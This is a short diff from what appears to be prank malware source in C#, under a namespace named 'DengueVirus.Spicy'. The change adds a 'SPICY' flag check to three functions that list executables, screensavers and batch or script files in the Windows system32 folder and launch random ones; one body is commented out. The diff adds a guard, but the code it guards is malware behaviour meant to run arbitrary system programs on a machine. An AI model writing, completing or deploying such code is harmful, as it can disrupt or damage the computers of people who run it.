@@ -70,6 +70,7 @@ namespace DengueVirus.Spicy
 
         public static void OpenRandomEXE()
         {
+            if (!SPICY) return;
             /*// Open a random exe file from system32
             string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
             Random random = new Random();
@@ -98,6 +99,7 @@ namespace DengueVirus.Spicy
 
         public static void OpenRandomScreensaver()
         {
+            if (!SPICY) return;
             // Open a random screensaver file from system32
             string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.scr");
             Random random = new Random();
@@ -109,6 +111,7 @@ namespace DengueVirus.Spicy
 
         public static void OpenRandomBatchFile()
         {
+            if (!SPICY) return;
             // Open a random batch file from system32, .bat, .cmd, .vbs, .ps1
             string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.bat");
             string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.cmd");
